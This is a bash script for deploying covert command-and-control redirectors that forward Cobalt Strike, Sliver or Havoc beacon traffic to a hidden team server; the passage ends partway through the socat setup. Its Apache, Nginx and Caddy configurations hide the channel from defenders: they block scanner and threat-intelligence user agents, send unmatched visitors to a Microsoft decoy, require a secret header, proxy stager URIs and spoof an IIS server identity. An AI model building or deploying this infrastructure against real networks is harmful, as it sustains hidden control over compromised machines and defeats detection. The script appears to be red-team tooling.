#!/usr/bin/env bash
# =============================================================================
# redirector-setup.sh
# Universal C2 Redirector Setup — Apache | Nginx | Caddy | Dumb-Pipe
# =============================================================================
# Author:       Derived from ARTOC scripts (Stigs @White Knight Labs) +
#               ARTOC knowledge base
# Profiles:     Supports artoc_orginal_cs_profile and artoc_aws_cs_profile
#               URI patterns baked in as presets (see PROFILE below)
# Usage:
#   sudo bash redirector-setup.sh
#
# Edit the CONFIGURATION block below before running.
# All decisions (web server, cert mode, profile preset) are made there.
#
# Compatibility: Ubuntu 20.04+ / Debian 11+, ARM (Raspberry Pi) and x86_64
#                Root access required. Internet access required for packages.
#
# Apache behaviour notes (Debian/Ubuntu):
#   - sites-enabled/, mods-enabled/, conf-enabled/ use symlinks — only symlinked
#     files are active. a2ensite / a2enmod / a2enconf manage those symlinks.
#   - mpm_prefork is required when mod_php is in use. mpm_event conflicts with
#     the PHP module and must be disabled first. This script handles that.
#   - deflate is enabled by default on Debian/Ubuntu and MUST be disabled for
#     Cobalt Strike. CS profiles declare Content-Encoding: gzip in the server
#     response block; deflate re-compresses that and the beacon decodes garbage.
#   - security.conf lives in conf-available/, not appended to apache2.conf.
#   - AllowOverride None is correct for VirtualHost-based configs. Only change it
#     to All if you specifically need .htaccess processing.
#   - apache2ctl -S is the definitive command to see what is actually active.
#   - ProxyPass to a TLS backend requires an explicit https:// scheme in the URL.
# =============================================================================

set -euo pipefail

# =============================================================================
# CONFIGURATION — edit this block before running
# =============================================================================

# ---- Redirector type --------------------------------------------------------
# Options: apache | nginx | caddy | dumbpipe-iptables | dumbpipe-socat
SERVER_TYPE="apache"

# ---- Profile preset ---------------------------------------------------------
# Options:
#   original   -> artoc_orginal_cs_profile   (jQuery / IIS spoof)
#   cloudfront -> artoc_aws_cs_profile       (Google SafeBrowsing / CloudFront)
#   custom     -> fill in C2_URI_GET / C2_URI_POST / SECRET_HEADER manually
PROFILE="original"

# ---- Network config ---------------------------------------------------------
TEAMSERVER_IP=""        # IP of your team server — never exposed to the internet
TEAMSERVER_PORT="443"   # Port your CS/Sliver/Havoc listener is on

# ---- Domain / cert ----------------------------------------------------------
DOMAIN=""               # e.g. updates-cdn.com  (leave blank for dumb-pipe)
CERT_MODE="letsencrypt" # selfsigned | letsencrypt | manual
# Manual mode: place your cert and key at these exact paths before running.
# These are overwritten at runtime by setup_cert() for selfsigned/letsencrypt.
# If CERT_MODE=manual, set these to where your cert files actually live.
CERT_CRT=""   # e.g. /etc/ssl/certs/mycert.crt  (leave blank for auto-modes)
CERT_KEY=""   # e.g. /etc/ssl/private/mykey.key  (leave blank for auto-modes)

# ---- Decoy ------------------------------------------------------------------
# Where non-matching traffic is silently redirected (never 403 -- that reveals detection)
DECOY_URL="https://www.microsoft.com"

# ---- Custom profile fields (only used when PROFILE=custom) ------------------
C2_URI_GET=""           # e.g. /api/v1/health
C2_URI_POST=""          # e.g. /api/v1/sync
SECRET_HEADER_NAME="Access-X-Control"
SECRET_HEADER_VAL="True"
BEACON_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# =============================================================================
# END CONFIGURATION
# =============================================================================

# --- Colour helpers ----------------------------------------------------------
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
error()   { echo -e "${RED}[-]${NC} $1"; exit 1; }
section() { echo -e "\n${CYAN}==== $1 ====${NC}\n"; }

# =============================================================================
# PROFILE RESOLUTION
# Apply URI / header / UA values from the chosen Malleable C2 profile preset
# =============================================================================
resolve_profile() {
    case "$PROFILE" in
        original)
            # artoc_orginal_cs_profile
            # GET:  /jquery/user/preferences
            # POST: /api/v2/jquery/settings/update
            # Custom header: Access-X-Control: True
            # UA: Chrome 119
            C2_URI_GET="/jquery/user/preferences"
            C2_URI_POST="/api/v2/jquery/settings/update"
            SECRET_HEADER_NAME="Access-X-Control"
            SECRET_HEADER_VAL="True"
            BEACON_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
            info "Profile: ARTOC Original (jQuery / IIS spoof)"
            ;;
        cloudfront)
            # artoc_aws_cs_profile
            # GET:  /safebrowsing/fp/kwL-HS0nl2B4g7pX4zQXYXrkrPsNBtN82S4PNYo
            # POST: /safebrowsing/fp/PQA-7OXETIzzxqT2Sxx1
            # NOTE: the original profile file has trailing spaces on these URIs — stripped here.
            # Custom header: Access-X-Control: True
            # UA: IE11 / Trident
            C2_URI_GET="/safebrowsing/fp/kwL-HS0nl2B4g7pX4zQXYXrkrPsNBtN82S4PNYo"
            C2_URI_POST="/safebrowsing/fp/PQA-7OXETIzzxqT2Sxx1"
            SECRET_HEADER_NAME="Access-X-Control"
            SECRET_HEADER_VAL="True"
            BEACON_UA="Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TNJB; MSAppHost/2.0; rv:11.0) like Gecko"
            info "Profile: ARTOC AWS CloudFront (SafeBrowsing / CloudFront)"
            ;;
        custom)
            # Values come from the CONFIGURATION block above
            [[ -z "$C2_URI_GET" ]]  && error "PROFILE=custom but C2_URI_GET is empty."
            [[ -z "$C2_URI_POST" ]] && error "PROFILE=custom but C2_URI_POST is empty."
            info "Profile: Custom (using manually set URIs and headers)"
            ;;
        *)
            error "Unknown PROFILE '${PROFILE}'. Options: original | cloudfront | custom"
            ;;
    esac

    # Trim all leading/trailing whitespace from URIs (handles copy-paste from profile files)
    # The %% operator only removes one trailing space per call; use sed for all whitespace
    C2_URI_GET="$(echo "${C2_URI_GET}" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
    C2_URI_POST="$(echo "${C2_URI_POST}" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
}

# =============================================================================
# PRE-FLIGHT CHECKS
# =============================================================================
preflight() {
    section "Pre-flight checks"
    [[ $EUID -ne 0 ]] && error "Must run as root (sudo bash $0)."

    [[ -z "$TEAMSERVER_IP" ]]   && error "TEAMSERVER_IP is not set."
    [[ -z "$TEAMSERVER_PORT" ]] && error "TEAMSERVER_PORT is not set."

    case "$SERVER_TYPE" in
        apache|nginx|caddy)
            [[ -z "$DOMAIN" ]] && error "DOMAIN is not set (required for ${SERVER_TYPE})."
            ;;
        dumbpipe-iptables|dumbpipe-socat)
            # Domain not needed for dumb-pipe; just needs target IP/port
            ;;
        *)
            error "Unknown SERVER_TYPE '${SERVER_TYPE}'. Options: apache | nginx | caddy | dumbpipe-iptables | dumbpipe-socat"
            ;;
    esac

    # Wait for cloud-init if this is a fresh cloud VPS
    if [[ -d /var/lib/cloud ]] && [[ ! -f /var/lib/cloud/instance/boot-finished ]]; then
        info "Waiting for cloud-init to finish..."
        until [[ -f /var/lib/cloud/instance/boot-finished ]]; do sleep 2; done
        info "Cloud-init complete."
    fi

    info "Pre-flight checks passed."
    echo ""
    echo "  Server type:   ${SERVER_TYPE}"
    echo "  Profile:       ${PROFILE}"
    echo "  Team server:   ${TEAMSERVER_IP}:${TEAMSERVER_PORT}"
    [[ -n "$DOMAIN" ]] && echo "  Domain:        ${DOMAIN}"
    echo "  Cert mode:     ${CERT_MODE}"
    echo "  GET URI:       ${C2_URI_GET:-<set after profile resolution>}"
    echo "  POST URI:      ${C2_URI_POST:-<set after profile resolution>}"
    echo "  Secret header: ${SECRET_HEADER_NAME}: ${SECRET_HEADER_VAL}"
    echo "  Decoy:         ${DECOY_URL}"
    echo ""

    # Confirm no conflicting service is already bound to port 80/443
    # ss -tlnp is more reliable than netstat on modern Debian
    if ss -tlnp | grep -qE ':80|:443'; then
        warn "Something is already listening on port 80 or 443:"
        ss -tlnp | grep -E ':80|:443' || true
        warn "This may conflict. Check with: apache2ctl -S"
    fi
}

# =============================================================================
# CERTIFICATE SETUP
# Shared by Apache and Nginx; Caddy handles certs automatically
# =============================================================================
setup_cert() {
    section "TLS Certificate (mode: ${CERT_MODE})"
    mkdir -p /etc/ssl/private /etc/ssl/certs

    case "$CERT_MODE" in
        selfsigned)
            CERT_CRT="/etc/ssl/certs/${DOMAIN}.crt"
            CERT_KEY="/etc/ssl/private/${DOMAIN}.key"
            openssl req -x509 -newkey rsa:4096 -sha256 -days 730 -nodes \
                -keyout "$CERT_KEY" \
                -out  "$CERT_CRT" \
                -subj "/CN=${DOMAIN}" \
                -addext "subjectAltName=DNS:${DOMAIN},DNS:www.${DOMAIN}" \
                2>/dev/null
            chmod 600 "$CERT_KEY"
            chmod 644 "$CERT_CRT"
            info "Self-signed cert → ${CERT_CRT}"
            warn "Self-signed cert will cause browser warnings. Beacons will ignore this (SSLProxyVerify None)."
            ;;

        letsencrypt)
            apt-get install -y certbot 2>/dev/null
            # Stop whichever web server is running so certbot can bind :80
            systemctl stop apache2 nginx caddy 2>/dev/null || true
            certbot certonly --standalone --non-interactive --agree-tos \
                --email "admin@${DOMAIN}" -d "${DOMAIN}" \
                || error "Certbot failed. Is port 80 open and DNS pointing to this host?"
            CERT_CRT="/etc/letsencrypt/live/${DOMAIN}/fullchain.pem"
            CERT_KEY="/etc/letsencrypt/live/${DOMAIN}/privkey.pem"
            # Map SERVER_TYPE to the actual systemd service name for the reload command
            # (dumbpipe types never call setup_cert, but guard anyway)
            local _svc
            case "$SERVER_TYPE" in
                apache)             _svc="apache2" ;;
                nginx)              _svc="nginx" ;;
                caddy)              _svc="caddy" ;;
                *)                  _svc="" ;;
            esac
            # Auto-renew every day at 03:00
            if [[ -n "$_svc" ]]; then
                (crontab -l 2>/dev/null; \
                 echo "0 3 * * * certbot renew --quiet && systemctl reload ${_svc}") \
                 | sort -u | crontab -
                info "Auto-renew cron added (03:00 daily, reloads ${_svc})."
            fi
            info "Let's Encrypt cert → ${CERT_CRT}"
            ;;

        manual)
            [[ -z "$CERT_CRT" ]] && error "Manual mode: CERT_CRT is not set in the config block."
            [[ -z "$CERT_KEY" ]] && error "Manual mode: CERT_KEY is not set in the config block."
            [[ -f "$CERT_CRT" ]] || error "Manual mode: cert not found at ${CERT_CRT}"
            [[ -f "$CERT_KEY" ]] || error "Manual mode: key not found at ${CERT_KEY}"
            info "Using manually placed cert at ${CERT_CRT}"
            ;;

        *)
            error "Unknown CERT_MODE '${CERT_MODE}'. Options: selfsigned | letsencrypt | manual"
            ;;
    esac
}

# =============================================================================
# APACHE SETUP
# Learned from: ARTOC server-setup.sh + domain-setup.sh + skill reference
# Adds: mod_security, IIS spoofing, 4-layer filter, ARTOC profile URIs
# =============================================================================
setup_apache() {
    section "Apache mod_rewrite Redirector"

    # -- Install ---------------------------------------------------------------
    info "Installing Apache and modules..."
    apt-get update -qq
    apt-get install -y apache2 libapache2-mod-security2 curl openssl

    # -- MPM selection ---------------------------------------------------------
    # mod_php (php_module) is incompatible with mpm_event and mpm_worker.
    # On Debian/Ubuntu, a fresh Apache install defaults to mpm_event.
    # If PHP is already installed (or later installed), that combination errors.
    # We always switch to mpm_prefork for compatibility. This is safe on any
    # Debian/Ubuntu host regardless of architecture (x86_64, ARM, etc.).
    info "Switching to mpm_prefork (required for mod_php compatibility on Debian/Ubuntu)..."
    a2dismod mpm_event mpm_worker 2>/dev/null || true
    a2enmod  mpm_prefork 2>/dev/null || true

    # -- Enable modules needed for C2 proxying --------------------------------
    # CRITICAL: deflate is intentionally NOT listed in a2enmod.
    #   Apache ships with deflate enabled on most Debian/Ubuntu installs.
    #   We disable it explicitly below regardless of current state.
    #   Reason: Cobalt Strike Malleable profiles set Content-Encoding: gzip in
    #   the server response block. If deflate is also active, Apache re-compresses
    #   an already-declared gzip response. The beacon receives double-encoded data,
    #   decodes garbage, and appears connected but produces no output.
    #   This applies to any Apache C2 redirector, not just specific distros.
    a2enmod proxy proxy_http proxy_connect proxy_ajp proxy_balancer             ssl rewrite headers security2

    # Disable deflate unconditionally — safe on any host, required for CS beacons
    a2dismod deflate 2>/dev/null || true
    info "deflate module disabled (prevents CS beacon response corruption)."

    # Disable directory indexing and default site
    a2dismod autoindex -f 2>/dev/null || true
    a2dissite 000-default.conf 2>/dev/null || true

    # -- Harden Apache identity -----------------------------------------------
    # security.conf lives in conf-available/ on Debian/Ubuntu Apache installs.
    # conf-enabled/security.conf is a symlink to conf-available/security.conf.
    # We patch conf-available/security.conf directly so changes persist through
    # a2enconf / a2disconf cycles. This is the standard Debian/Ubuntu Apache layout.
    SECURITY_CONF="/etc/apache2/conf-available/security.conf"
    sed -i "s/ServerSignature On/ServerSignature Off/g"   "$SECURITY_CONF" 2>/dev/null || true
    sed -i "s/ServerTokens OS/ServerTokens Prod/g"        "$SECURITY_CONF" 2>/dev/null || true
    # Patch all verbose variants — Debian/Ubuntu may ship OS, Full, or Full+Canonical
    sed -i "s/ServerTokens Full/ServerTokens Prod/g"              "$SECURITY_CONF" 2>/dev/null || true
    sed -i "s/ServerTokens Full+Canonical/ServerTokens Prod/g"    "$SECURITY_CONF" 2>/dev/null || true

    # ModSecurity: spoof server signature as IIS.
    # Guard against duplicate entries on re-runs.
    grep -qF 'SecServerSignature Microsoft-IIS/10.0' "$SECURITY_CONF"         || echo 'SecServerSignature Microsoft-IIS/10.0' >> "$SECURITY_CONF"
    a2enconf security 2>/dev/null || true

    # Headers module: set Server header and strip X-Powered-By on all responses.
    # This catches any response that bypasses ModSecurity.
    # Also set Referrer-Policy: no-referrer so victim browsers do not leak origin.
    cat > /etc/apache2/conf-available/c2-headers.conf << 'HDR'
<IfModule mod_headers.c>
    Header always set    Server          "Microsoft-IIS/10.0"
    Header always unset  X-Powered-By
    Header always set    Referrer-Policy "no-referrer"
    Header always unset  X-AspNet-Version
</IfModule>
HDR
    a2enconf c2-headers 2>/dev/null || true

    # -- Cert ------------------------------------------------------------------
    setup_cert

    # -- Virtual host ----------------------------------------------------------
    info "Writing VirtualHost config..."
    local CONF="/etc/apache2/sites-available/${DOMAIN}-redir.conf"

    cat > "$CONF" << APACHE_EOF
# =============================================================================
# Apache C2 Redirector
# Profile:     ${PROFILE}
# Team server: ${TEAMSERVER_IP}:${TEAMSERVER_PORT}
# Generated:   $(date)
# =============================================================================

# HTTP -> HTTPS upgrade
<VirtualHost *:80>
    ServerName ${DOMAIN}
    RewriteEngine On
    RewriteCond %{HTTPS} !=on
    RewriteRule ^(.*)$ https://${DOMAIN}%{REQUEST_URI} [L,R=301]
</VirtualHost>

<VirtualHost *:443>
    ServerName ${DOMAIN}
    DocumentRoot /var/www/html

    # Disable directory listing and lock down web root.
    # -Indexes prevents Apache from returning a directory listing when no
    # index file exists — a common information leak on misconfigured servers.
    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    # TLS
    SSLEngine On
    SSLCertificateFile    ${CERT_CRT}
    SSLCertificateKeyFile ${CERT_KEY}

    # Trust self-signed cert on team server backend (Cobalt Strike default)
    SSLProxyEngine On
    SSLProxyVerify None
    SSLProxyCheckPeerCN Off
    SSLProxyCheckPeerName Off
    SSLProxyCheckPeerExpire Off

    # Preserve the Host header so the team server sees the correct domain
    ProxyPreserveHost On

    # Logging: separate log file per vhost so you can tail just this redirector.
    # Standard Apache practice — keeps redirector traffic isolated from other vhosts.
    ErrorLog  /var/log/apache2/${DOMAIN}-error.log
    CustomLog /var/log/apache2/${DOMAIN}-access.log combined

    RewriteEngine On

    # -------------------------------------------------------------------------
    # LAYER 1: Block known scanner / bot / threat-intel User-Agents
    # Silent 302 — never 403 (403 tells them they were detected)
    # The beacon UA from profile: ${BEACON_UA}
    # -------------------------------------------------------------------------
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|go-http|nmap|masscan|zgrab|nuclei|nikto|sqlmap|dirbuster|burpsuite|nessus|qualys|shodan|censys|googlebot|bingbot|yandex|baidu|slackbot|netcraft|httrack|xforce|libwww|lwp-trivial|openbsd|jakarta|java/|robot|spider|crawl) [NC]
    RewriteRule ^(.*)$ ${DECOY_URL} [L,R=302]

    # -------------------------------------------------------------------------
    # LAYER 2: Require secret header
    # Profile sends: ${SECRET_HEADER_NAME}: ${SECRET_HEADER_VAL}
    # Anything missing this header goes to decoy silently
    # -------------------------------------------------------------------------
    RewriteCond %{HTTP:${SECRET_HEADER_NAME}} !^${SECRET_HEADER_VAL}$ [NC]
    RewriteRule ^(.*)$ ${DECOY_URL} [L,R=302]

    # -------------------------------------------------------------------------
    # LAYER 3: URI allowlist — only C2 paths reach the team server
    # Profiles: ${PROFILE}
    # GET  URI: ${C2_URI_GET}
    # POST URI: ${C2_URI_POST}
    # NOTE: dots escaped as \. in regex (unescaped dot matches any char)
    #
    # Backend URL always uses explicit https:// scheme below.
    # A bare-IP ProxyPass without a scheme (e.g. "ProxyPass / 10.0.0.1/")
    # silently falls back to plain HTTP and will not open a TLS connection
    # to the team server. Always include the scheme for TLS backends.
    # -------------------------------------------------------------------------

    # GET check-in
    RewriteCond %{REQUEST_URI} ^$(echo "${C2_URI_GET}" | sed 's/\./\\./g')$ [NC]
    RewriteRule ^(.*)$ https://${TEAMSERVER_IP}:${TEAMSERVER_PORT}%{REQUEST_URI} [P,L]

    # POST check-in
    RewriteCond %{REQUEST_URI} ^$(echo "${C2_URI_POST}" | sed 's/\./\\./g')$ [NC]
    RewriteRule ^(.*)$ https://${TEAMSERVER_IP}:${TEAMSERVER_PORT}%{REQUEST_URI} [P,L]

    # Cobalt Strike staged payload stager URI (random 4-char string)
    # Remove this block if using stageless beacons (host_stage "false" in profile)
    RewriteCond %{REQUEST_URI} ^/[a-zA-Z0-9]{4}$ [NC]
    RewriteRule ^(.*)$ https://${TEAMSERVER_IP}:${TEAMSERVER_PORT}%{REQUEST_URI} [P,L]

    # -------------------------------------------------------------------------
    # FALLBACK: everything else goes to decoy
    # Blue team browsing the domain sees a legitimate redirect
    # -------------------------------------------------------------------------
    RewriteRule ^(.*)$ ${DECOY_URL} [L,R=302]

    # Custom error page — even direct 404 hits look normal
    ErrorDocument 404 /index.html
</VirtualHost>
APACHE_EOF

    # NOTE: AllowOverride is intentionally left as None.
    # All rewrite and proxy rules live in the VirtualHost block above, not
    # in .htaccess files. Changing AllowOverride to All across apache2.conf
    # is unnecessary for VirtualHost-based configs and weakens the default
    # security model (the root / Directory deny-all would also be affected).

    a2ensite "${DOMAIN}-redir.conf"

    # Validate before reloading
    apache2ctl configtest || error "Apache config syntax error. Check ${CONF}"
    systemctl enable apache2
    systemctl restart apache2
    info "Apache redirector live."

    # Show exactly what Apache is serving — the definitive active-config view.
    # apache2ctl -S prints VirtualHosts, ports, and which config file each came from.
    echo ""
    info "Active Apache configuration (apache2ctl -S):"
    apache2ctl -S 2>&1 | sed 's/^/  /'
    echo ""

    # deflate is disabled above but warn if it somehow got re-enabled
    if apache2ctl -M 2>/dev/null | grep -q deflate_module; then
        warn "deflate module is still loaded. Run: a2dismod deflate && systemctl reload apache2"
        warn "deflate compresses CS beacon responses and breaks beacon decoding."
    fi
}

# =============================================================================
# NGINX SETUP
# =============================================================================
setup_nginx() {
    section "Nginx Redirector"

    info "Installing nginx..."
    apt-get update -qq
    apt-get install -y nginx libnginx-mod-http-headers-more-filter curl openssl

    # -- Cert ------------------------------------------------------------------
    setup_cert

    # -- Config ----------------------------------------------------------------
    info "Writing nginx config..."
    local CONF="/etc/nginx/sites-available/c2-redirector"

    cat > "$CONF" << NGINX_EOF
# =============================================================================
# Nginx C2 Redirector
# Profile:     ${PROFILE}
# Team server: ${TEAMSERVER_IP}:${TEAMSERVER_PORT}
# Generated:   $(date)
# =============================================================================

upstream teamserver {
    server ${TEAMSERVER_IP}:${TEAMSERVER_PORT};
    # Failover: if team server goes down, serve decoy — operation appears normal
    # server 127.0.0.1:8080 backup;
}

# HTTP -> HTTPS
server {
    listen 80;
    server_name ${DOMAIN};
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name ${DOMAIN};

    ssl_certificate     ${CERT_CRT};
    ssl_certificate_key ${CERT_KEY};
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;

    # Hide nginx version; spoof as IIS (ARTOC pattern)
    server_tokens off;
    more_set_headers "Server: Microsoft-IIS/10.0";
    more_clear_headers "X-Powered-By";

    access_log /var/log/nginx/${DOMAIN}.access.log;
    error_log  /var/log/nginx/${DOMAIN}.error.log;

    # -------------------------------------------------------------------------
    # LAYER 1: Block scanner / bot User-Agents
    # Profile beacon UA: ${BEACON_UA}
    # -------------------------------------------------------------------------
    if (\$http_user_agent ~* (curl|wget|python|go-http|nmap|masscan|zgrab|nuclei|nikto|sqlmap|dirbuster|burpsuite|nessus|qualys|shodan|censys|googlebot|bingbot|yandex|baidu|slackbot|netcraft|httrack|xforce|libwww|robot|spider|crawl)) {
        return 302 ${DECOY_URL};
    }

    # -------------------------------------------------------------------------
    # LAYER 2+3: GET URI — ${C2_URI_GET}
    # -------------------------------------------------------------------------
    location = ${C2_URI_GET} {
        # Layer 2: secret header check
        # nginx converts header hyphens to underscores in $http_ vars
        if (\$http_$(echo "${SECRET_HEADER_NAME}" | tr '[:upper:]-' '[:lower:]_') != "${SECRET_HEADER_VAL}") {
            return 302 ${DECOY_URL};
        }
        proxy_pass          https://teamserver;
        proxy_ssl_verify    off;          # Team server uses self-signed cert
        proxy_ssl_server_name on;
        proxy_set_header    Host \$host;
        proxy_set_header    X-Forwarded-For \$remote_addr;
        proxy_hide_header   X-Powered-By;
        gzip                off;          # Prevent beacon response corruption
    }

    # -------------------------------------------------------------------------
    # LAYER 2+3: POST URI — ${C2_URI_POST}
    # -------------------------------------------------------------------------
    location = ${C2_URI_POST} {
        if (\$http_$(echo "${SECRET_HEADER_NAME}" | tr '[:upper:]-' '[:lower:]_') != "${SECRET_HEADER_VAL}") {
            return 302 ${DECOY_URL};
        }
        proxy_pass           https://teamserver;
        proxy_ssl_verify     off;
        proxy_ssl_server_name on;
        proxy_set_header     Host \$host;
        proxy_set_header     X-Forwarded-For \$remote_addr;
        client_max_body_size 50m;         # Beacon can POST large data chunks
        gzip                 off;
    }

    # -------------------------------------------------------------------------
    # Cobalt Strike stager URI (4-char random, only if host_stage = true)
    # Remove if profile sets host_stage "false"
    # -------------------------------------------------------------------------
    location ~ ^/[a-zA-Z0-9]{4}$ {
        if (\$http_$(echo "${SECRET_HEADER_NAME}" | tr '[:upper:]-' '[:lower:]_') != "${SECRET_HEADER_VAL}") {
            return 302 ${DECOY_URL};
        }
        proxy_pass       https://teamserver;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
    }

    # -------------------------------------------------------------------------
    # FALLBACK: everything else -> decoy
    # -------------------------------------------------------------------------
    location / {
        return 302 ${DECOY_URL};
    }
}
NGINX_EOF

    # Remove default site, enable ours
    rm -f /etc/nginx/sites-enabled/default
    ln -sf "$CONF" /etc/nginx/sites-enabled/c2-redirector

    nginx -t || error "nginx config syntax error. Check ${CONF}"
    systemctl enable nginx
    systemctl restart nginx
    info "nginx redirector live."
}

# =============================================================================
# CADDY SETUP
# Auto-TLS: no certbot needed. Caddy handles Let's Encrypt automatically.
# =============================================================================
setup_caddy() {
    section "Caddy Redirector (Auto-TLS)"

    info "Installing Caddy..."
    apt-get install -y debian-keyring debian-archive-keyring apt-transport-https curl
    curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' \
        | gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
    curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' \
        | tee /etc/apt/sources.list.d/caddy-stable.list
    apt-get update -qq && apt-get install -y caddy

    mkdir -p /var/log/caddy
    chown caddy:caddy /var/log/caddy 2>/dev/null || true

    info "Writing Caddyfile..."
    cat > /etc/caddy/Caddyfile << CADDY_EOF
# =============================================================================
# Caddy C2 Redirector
# Profile:     ${PROFILE}
# Team server: ${TEAMSERVER_IP}:${TEAMSERVER_PORT}
# Caddy auto-provisions and renews TLS — no certbot needed
# Generated:   $(date)
# =============================================================================

${DOMAIN} {

    # Spoof server identity as IIS (ARTOC pattern)
    header Server "Microsoft-IIS/10.0"
    header -X-Powered-By

    # Access log for post-op analysis
    log {
        output file /var/log/caddy/${DOMAIN}.access.log
        format json
    }

    # -------------------------------------------------------------------------
    # LAYER 1: Block scanner / bot User-Agents
    # Profile beacon UA: ${BEACON_UA}
    # -------------------------------------------------------------------------
    @scanners {
        header_regexp User-Agent (curl|wget|python|go-http|nmap|masscan|zgrab|nuclei|nikto|sqlmap|dirbuster|burpsuite|nessus|qualys|shodan|censys|googlebot|bingbot|yandex|baidu|slackbot|netcraft|httrack|xforce|libwww|robot|spider|crawl)
    }
    redir @scanners ${DECOY_URL} 302

    # -------------------------------------------------------------------------
    # LAYER 2: Require secret header (${SECRET_HEADER_NAME}: ${SECRET_HEADER_VAL})
    # -------------------------------------------------------------------------
    @missing_header {
        not header ${SECRET_HEADER_NAME} ${SECRET_HEADER_VAL}
    }
    redir @missing_header ${DECOY_URL} 302

    # -------------------------------------------------------------------------
    # LAYER 3: URI allowlist
    # GET URI:  ${C2_URI_GET}
    # POST URI: ${C2_URI_POST}
    # -------------------------------------------------------------------------
    @c2_get {
        path ${C2_URI_GET}
        header ${SECRET_HEADER_NAME} ${SECRET_HEADER_VAL}
    }
    reverse_proxy @c2_get https://${TEAMSERVER_IP}:${TEAMSERVER_PORT} {
        header_up Host {upstream_hostport}
        header_up X-Forwarded-For {remote_host}
        transport http {
            tls_insecure_skip_verify   # Team server uses self-signed cert
        }
    }

    @c2_post {
        path ${C2_URI_POST}
        method POST
        header ${SECRET_HEADER_NAME} ${SECRET_HEADER_VAL}
    }
    reverse_proxy @c2_post https://${TEAMSERVER_IP}:${TEAMSERVER_PORT} {
        header_up Host {upstream_hostport}
        header_up X-Forwarded-For {remote_host}
        transport http {
            tls_insecure_skip_verify
        }
    }

    # Cobalt Strike stager (remove if host_stage = false in profile)
    @stager {
        path_regexp stager ^/[a-zA-Z0-9]{4}$
        header ${SECRET_HEADER_NAME} ${SECRET_HEADER_VAL}
    }
    reverse_proxy @stager https://${TEAMSERVER_IP}:${TEAMSERVER_PORT} {
        transport http {
            tls_insecure_skip_verify
        }
    }

    # -------------------------------------------------------------------------
    # FALLBACK: everything else -> decoy
    # -------------------------------------------------------------------------
    redir * ${DECOY_URL} 302
}
CADDY_EOF

    caddy validate --config /etc/caddy/Caddyfile \
        || error "Caddyfile syntax error. Check /etc/caddy/Caddyfile"
    systemctl enable caddy
    systemctl restart caddy
    info "Caddy redirector live. TLS cert will auto-provision on first request."
}

# =============================================================================
# DUMB-PIPE: iptables
# Kernel-level blind forwarding. No filtering. Use for throwaway nodes only.
# =============================================================================
setup_dumbpipe_iptables() {
    section "Dumb-Pipe Redirector (iptables)"

    info "Configuring iptables NAT forwarding..."

    # Enable IP forwarding (required for NAT)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    # Only append to sysctl.conf if not already present (idempotent on re-runs)
    grep -qF 'net.ipv4.ip_forward' /etc/sysctl.conf \
        || echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
    sysctl -p

    # Accept inbound on 443 and 80
    iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
    iptables -I INPUT -p tcp -m tcp --dport 80  -j ACCEPT

    # DNAT: rewrite destination to team server
    iptables -t nat -A PREROUTING -p tcp --dport 443 \
        -j DNAT --to-destination "${TEAMSERVER_IP}:${TEAMSERVER_PORT}"
    iptables -t nat -A PREROUTING -p tcp --dport 80 \
        -j DNAT --to-destination "${TEAMSERVER_IP}:80"

    # MASQUERADE: rewrite source so return traffic comes back via redirector
    iptables -t nat -A POSTROUTING -j MASQUERADE
    iptables -I FORWARD -j ACCEPT
    iptables -P FORWARD ACCEPT

    # Persist rules across reboots
    apt-get install -y iptables-persistent 2>/dev/null || true
    mkdir -p /etc/iptables
    netfilter-persistent save 2>/dev/null || iptables-save > /etc/iptables/rules.v4

    info "iptables rules set. ALL traffic on :443 and :80 is forwarded to ${TEAMSERVER_IP}:${TEAMSERVER_PORT}"
    warn "No filtering — any scanner hitting this node will reach your team server."
    warn "Use this only for throwaway infrastructure or short-duration ops."

    echo ""
    echo "  Verify with:"
    echo "    iptables -t nat -L -n -v --line-numbers"
    echo "    tcpdump -i eth0 -n port 443"
}

# =============================================================================
# DUMB-PIPE: socat
# Userspace forwarding. Easier to kill/restart than iptables.
# Lower performance under high beacon load — use iptables for that.
# =============================================================================
setup_dumbpipe_socat() {
    section "Dumb-Pipe Redirector (socat)"

    apt-get update -qq
    apt-get install -y socat screen

    info "Writing socat systemd service..."
    cat > /etc/systemd/system/c2-redir-443.service << SERVICE_EOF
[Unit]
Description=C2 socat redirector port 443
After=network.target

[Service]
Type=simple
# Fork creates a new child process per connection — required for multiple beacons
ExecStart=/usr/bin/socat TCP4-LISTEN:443,fork TCP4:${TEAMSERVER_IP}:${TEAMSERVER_PORT}
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
SERVICE_EOF

    cat > /etc/systemd/system/c2-redir-80.service << SERVICE_EOF
[Unit]
Description=C2 socat redirector port 80
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/socat TCP4-LISTEN:80,fork TCP4:${TEAMSERVER_IP}:80
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
SERVICE_EOF

    systemctl daemon-reload
    systemctl enable --now c2-redir-443 c2-redir-80
    systemctl status c2-redir-443 --no-pager

    info "socat redirectors live."
    warn "No filtering — any scanner hitting this node will reach your team server."
    warn "If you see high CPU under load, switch to dumbpipe-iptables."

    echo ""
    echo "  Verify with:"
    echo "    systemctl status c2-redir-443"
